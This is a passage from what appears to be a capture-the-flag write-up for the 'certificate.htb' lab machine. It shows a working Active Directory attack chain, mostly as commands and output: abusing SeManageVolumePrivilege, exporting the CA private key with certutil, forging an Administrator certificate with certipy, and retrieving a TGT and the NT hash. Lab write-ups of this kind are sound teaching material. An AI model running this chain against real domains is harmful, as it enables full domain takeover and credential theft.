SeMachineAccountPrivilege     Add workstations to domain       Enabled
SeChangeNotifyPrivilege       Bypass traverse checking         Enabled
SeManageVolumePrivilege       Perform volume maintenance tasks Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set   Enabled
```

- download and run exploit in target machine
- https://github.com/CsEnox/SeManageVolumeExploit
- after ...

```
*Evil-WinRM* PS C:\Users\Ryan.K\Documents> certutil -store my

================ Certificate 2 ================
Serial Number: 75b2f4bbf31f108945147b466131bdca
Issuer: CN=Certificate-LTD-CA, DC=certificate, DC=htb
 NotBefore: 11/3/2024 3:55 PM
 NotAfter: 11/3/2034 4:05 PM
Subject: CN=Certificate-LTD-CA, DC=certificate, DC=htb
Certificate Template Name (Certificate Type): CA
CA Version: V0.0
Signature matches Public Key
Root Certificate: Subject matches Issuer
Template: CA, Root Certification Authority
Cert Hash(sha1): 2f02901dcff083ed3dbb6cb0a15bbfee6002b1a8
  Key Container = Certificate-LTD-CA
  Provider = Microsoft Software Key Storage Provider
Missing stored keyset
CertUtil: -store command completed successfully.
```

```
*Evil-WinRM* PS C:\Users\Ryan.K\Documents> certutil -exportPFX My 75b2f4bbf31f108945147b466131bdca ca.pfx

My "Personal"
================ Certificate 2 ================
Serial Number: 75b2f4bbf31f108945147b466131bdca
Issuer: CN=Certificate-LTD-CA, DC=certificate, DC=htb
 NotBefore: 11/3/2024 3:55 PM
 NotAfter: 11/3/2034 4:05 PM
Subject: CN=Certificate-LTD-CA, DC=certificate, DC=htb
Certificate Template Name (Certificate Type): CA
CA Version: V0.0
Signature matches Public Key
Root Certificate: Subject matches Issuer
Template: CA, Root Certification Authority
Cert Hash(sha1): 2f02901dcff083ed3dbb6cb0a15bbfee6002b1a8
  Key Container = Certificate-LTD-CA
  Unique container name: 26b68cbdfcd6f5e467996e3f3810f3ca_7989b711-2e3f-4107-9aae-fb8df2e3b958
  Provider = Microsoft Software Key Storage Provider
Signature test passed
Enter new password for output file ca.pfx:
Enter new password:
Confirm new password:
CertUtil: -exportPFX command completed successfully.
```

```
└─$ certipy forge -ca-pfx ca.pfx -out goldentkt.pfx -upn Administrator
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Saving forged certificate and private key to 'goldentkt.pfx'
[*] Wrote forged certificate and private key to 'goldentkt.pfx'
```

```
└─$ faketime -f +8hr certipy auth -pfx goldentkt.pfx -dc-ip 10.10.11.71 -domain certificate.htb -username Administrator
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'Administrator'
[*] Using principal: 'administrator@certificate.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@certificate.htb': aad3b435b51404eeaad3b435b51404ee:d804304519bf0143c14cbf1c024408c6
```
